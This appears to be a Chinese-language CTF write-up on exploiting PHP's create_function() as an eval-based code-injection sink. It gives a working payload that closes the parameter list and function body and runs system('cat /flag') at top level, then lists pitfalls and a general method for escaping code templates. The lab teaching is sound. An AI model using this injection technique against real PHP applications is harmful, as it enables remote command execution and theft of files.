## 一句话

> **`create_function($a, $b)` 不是"定义函数"，它就是 `eval("function __lambda_func($a) { $b }")`** ——
> 所以 `$b` 里的**顶层语句会立刻执行**；而 `$a` 站在**形参列表**的位置，**语法上只接受 `$变量`**。
> 正解：把 `$a` 用 `)` 提前闭合，函数体留空，命令写在**顶层**。

## 一、题目

入口很直白，两个参数直接喂进 `create_function`：

```php
create_function($shell, $nss)
```

两个参数都来自用户输入 → 直接就是代码注入。

## 二、关键认知：`create_function` 到底做了什么

```php
create_function($shell, $nss)
// 内部拼出：
//   function __lambda_func($shell) { $nss }
// 然后 eval 这段字符串
```

**三条推论，缺一不可**：

| # | 事实 | 后果 |
|---|---|---|
| 1 | `$shell` 占据**函数参数列表**的位置 | 语法上**只接受 `$变量`**（写 `1` 会**编译期**失败） |
| 2 | `$nss` 是**函数体** | 写进去的代码会被执行 |
| 3 | 它本质是 **`eval`**，不是"定义函数" | **顶层语句立即执行**，函数定义只是顺带注册 |

## 三、正解 payload

```
POST shell=){}system('cat /flag');//
     nss=1;
```

**拼出来的字符串长这样**：

```php
function __lambda_func(){}system('cat /flag');//) { 1; }
```

**逐段拆解**：

| 片段 | 作用 |
|---|---|
| `)` | **闭合参数列表**（`$shell` 本来要填的东西直接留空） |
| `{}` | **立刻结束函数体** —— 函数定义到此为止 |
| `system('cat /flag');` | 写在**顶层**，`eval` 到这行**立刻执行** |
| `//` | 注释掉后面的残骸 `) { 1; }` |

> 关键点：**命令不是写在函数体里，而是"逃"到函数体外面**。
> `{}` 一闭合，后面的内容就不再属于 `__lambda_func`，而是 `eval` 的顶层语句。

## 四、踩坑

| 问题 | 原因 | 解决 |
|---|---|---|
| **`shell=1` 什么都不执行** | `1` 不是合法的**函数形参** → `eval` **编译期**就炸 → `nss` 里的代码**一行都不跑** | `shell` 留空 / 写 `$a`，或者干脆改从 `shell` 注入 |
| 改了 `nss` 没反应 | 编译失败发生在 `nss` 之前 | 先确认 `shell` 能让整段**编译通过** |

**教训**：**"没反应"不代表"代码没执行"** —— 这里的根因是**编译期报错**，
整个 `eval` 字符串一个字都没跑。所以**改 payload 时要一段一段确认能不能编译通过**。

## 五、可复用方法论

| 步骤 | 做法 |
|---|---|
| ① 认出 sink | 看到 `create_function` / `eval` / `assert` / `preg_replace` 带 `/e` → 代码执行类 |
| ② 想清楚**拼出来的字符串**长什么样 | 把模板和用户输入**手工拼一遍**，写在纸上 |
| ③ 找"跳出位置" | 参数列表 / 函数体 / 字符串字面量 —— 哪一层能提前闭合 |
| ④ 用注释吃掉残骸 | `//` 或 `/* */` 处理多余的 `) { }` |
| ⑤ 顶层写命令 | 因为它是 `eval`，顶层语句一定执行 |

**同类形状**：凡是「用户输入被拼进一段代码模板再 eval」的题，都是这个套路 ——
先还原拼接结果，再找闭合点。
